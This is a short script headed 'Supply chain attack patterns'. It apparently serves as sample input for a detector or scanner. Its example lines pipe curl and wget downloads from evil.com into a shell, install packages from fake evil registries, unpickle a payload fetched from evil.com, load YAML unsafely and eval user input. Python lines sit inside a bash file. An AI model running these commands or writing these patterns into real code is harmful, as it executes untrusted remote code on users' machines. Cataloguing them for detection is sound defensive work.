#!/bin/bash
# Supply chain attack patterns

# Curl pipe to shell
curl https://evil.com/install.sh | sh
wget https://evil.com/setup.sh -O - | bash

# Custom package registry
pip install malicious-package --index-url https://evil.pypi.com/simple
npm install bad-module --registry https://evil.npm.com

# Unsafe YAML load
import yaml
data = yaml.load(open("config.yml"))

# Pickle from network
import pickle
payload = pickle.loads(requests.get("https://evil.com/payload").content)

# Eval user input
user_input = input("Enter command: ")
eval(user_input)
